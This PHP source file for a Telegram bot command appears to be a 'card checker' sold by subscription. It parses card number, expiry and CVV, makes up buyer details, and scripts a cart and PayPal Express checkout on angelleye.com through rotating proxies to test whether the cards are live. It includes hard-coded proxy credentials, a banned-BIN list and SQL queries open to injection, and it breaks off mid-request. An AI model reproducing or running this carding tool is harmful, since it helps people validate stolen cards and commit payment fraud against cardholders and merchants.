<?php
list($cmd) = explode(" ", $text);
if($cmd == "/pp" or $cmd == ".pp" or $cmd == "!pp" or $cmd == "?pp" or $cmd == "#pp" or $cmd == ":pp" or $cmd == ",pp"){ 

    if($user_id !=5197853005){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ Proxy Dead", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    if($cmd == '/pp'){
        $gatecmd = "pp";
    }elseif($cmd == ".pp"){
        $gatecmd = "pp";
    }elseif($cmd == "!pp"){
        $gatecmd = "pp";
    }elseif($cmd == "?pp"){
        $gatecmd = "pp";
    }elseif($cmd == "#pp"){
        $gatecmd = "pp";
    }elseif($cmd == ":pp"){
        $gatecmd = "pp";
    }elseif($cmd == ",pp"){
        $gatecmd = "pp";
    }
    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    $sql = "SELECT gatecmd FROM gateway WHERE gatecmd='$gatecmd'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $gatec = anicap($final2, '"gatecmd":"','"');
    mysqli_close(mysqlcon());
    
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    
    $now = time();
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "<b>Gate not added, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @AniDec4ypt3d </b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @AniDec4ypt3d 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @AniDec4ypt3d", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @AniDec4ypt3d", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @AniDec4ypt3d", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    $cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "p.webshare.io:80",


        "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
    ];
    

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
    $banned_bins = ['485953', '650907', '515462', '489504', '534417', '483698', '403015', '435880', '522158', '515478', '440393', '472926', '498503', '542418', '559900', '540324', '484718', '423223', '510404', '546616', '459192', '510409', '539817', '429435', '426370', '521069', '549627', '437507', '542717', '520593', '494656', '529794', '457286', '428303', '476771', '531106', '494160', '411810', '409177', '481969', '536595', '557945', '485340', '530446', '511114', '559591', '549184', '414720', '546775', '414397', '437303', '424067', '540449', '475465', '524038', '435167', '511098', '499818', '537489', '547115', '414398', '512487', '420495', '430460', '521380', '425032', '530544', '491449', '522714', '567511', '154620', '432672', '537445', '526293', '403935', '533621', '401924', '402360', '489049', '533325', '402018', '405482', '535463', '533814', '529559', '538923', '535456', '531108', '541591', '481776', '403446', '540302', '533935', '498872', '540608', '472776', '533248', '484224', '446053', '410039', '601120', '442732', '377935', '543816', '601149', '372300', '529750', '415285', '415231', '473327', '408832', '514503', '523434', '450742', '518375', '485246', '537664', '554714', '533728', '525855', '410489', '522686', '412003', '443161', '440229', '459510', '539123', '519325', '531340', '530347', '516488', '436681', '559911', '457572', '464732', '546001', '468840', '453756', '525103', '601140', '545348', '533317', '411600', '537697', '511558', '467199', '464556', '424002', '557348', '442743', '530551', '403995', '483039', '483316', '416860', '521403', '405433', '539689', '526736', '481775', '515472', '511516', '442062', '526274', '444607', '539636', '451431', '533582', '438959', '402361', '445785', '512773', '453744', '539634', '511361', '440353', '455172', '529053', '520828', '404841', '473690', '478499', '539591', '416995', '526491', '422589', '419113', '469395', '548793', '515477', '402063', '527527', '527368', '549399', '554730', '467321', '533004', '526430', '441686', '428149', '493452', '523471', '453308', '428346', '428307', '416722', '529086', '454481', '414693', '411192', '413514', '516989', '513213', '400045', '481285', '519404', '519280', '540226', '511565', '527346', '441101', '539854', '530706', '559758', '517805', '511673', '527789', '511332', '530690', '542935', '529275', '511774', '524467', '452018', '403530', '469396', '511350', '511321', '404386', '473947', '485912', '409758', '517476', '527837', '535971', '515519', '400331', '493595', '511564', '527395', '445507', '536659', '432465', '522096', '439457', '400921', '453081', '522157', '404585', '538875', '516121', '522719', '534228', '544544', '491288', '511563', '528227', '453973', '544586', '403905', '516155', '537207', '411894', '408635', '522725', '539226', '526250', '441070', '424840', '515101', '512092', '529063', '489212', '511317', '457949', '533862', '527329', '515549', '410352', '407714', '400632', '451002', '537911', '530772', '428486', '511330', '519532', '546324', '516532', '533813', '548274', '516502', '510087', '557838', '513207', '530964', '514998', '534548', '516520', '516508', '542837', '533281', '511560', '527351', '529567', '448975', '531170', '515554', '533821', '535480', '544768', '423991', '538651', '533984', '532081', '425096', '538792', '511089', '530082', '537666', '539186', '527069', '539175', '548566', '544679', '485320', '451129', '517163', '420064', '533323', '494159', '526724', '537915', '484735', '527660', '401188', '432168', '512150', '533842', '511467', '513252', '532164', '401921', '479613', '468271', '401719', '402400', '401658', '400022', '475129', '416598', '548398', '506731', '563294', '459354', '549622', '416994', '639167', '475675', '472409', '415059', '432154', '445677', '419973', '455479', '427432', '510126', '529172', '529923', '428813', '532613', '454861', '540300', '540305', '540309', '540333', '540335', '540350', '540356', '540357', '540369', '540396', '544215', '554723', '554756', '627895', '376752', '357401', '372742', '375150', '422803', '459654', '530072', '466544', '468789', '514858', '422403', '473653',];
        // if($bin == "440393"){
        //     $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        //     $m1  = SendMessage($content);
        //     exit;
        // }else {
                
        // }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code>▱▱▱▱▱▱▱▱▱▱ 0%</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▱▱▱▱▱▱▱▱▱ 9%</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
#-------------------- Bin -------------#
$cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('anibhai'));
$last = ucfirst(str_shuffle('pemro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

#------[GET]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: GET';
$headers[] = 'path: /product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);

$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▱▱▱▱▱▱▱▱▱ 10%</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
#------[CURL- CART]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: POST';
$headers[] = 'path: /product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundarycV2dmaiVGjllREJ3';
$headers[] = 'origin: https://www.angelleye.com';
$headers[] = 'referer: https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="add-to-cart"

135095
------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="add-to-cart"

135095
------WebKitFormBoundarycV2dmaiVGjllREJ3--');
$curl01 = curl_exec($ch);




#------[GET-2]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/cart/');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: GET';
$headers[] = 'path: /cart/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'referer: https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/53';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get2 = curl_exec($ch);
$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▰▰▱▱▱▱▱▱▱ 30%</b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

#------[CURL-2]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/wc-api/WC_Gateway_PayPal_Express_AngellEYE?pp_action=set_express_checkout');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: POST';
$headers[] = 'path: /wc-api/WC_Gateway_PayPal_Express_AngellEYE?pp_action=set_express_checkout';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.angelleye.com';
$headers[] = 'referer: https://www.angelleye.com/cart/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'request_from=JSv4');
$curl02 = curl_exec($ch);
$token = getData($curl02,'"token":"','"');


#------[CURL- EXTRA]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?UpdateClientConfig');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?UpdateClientConfig';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
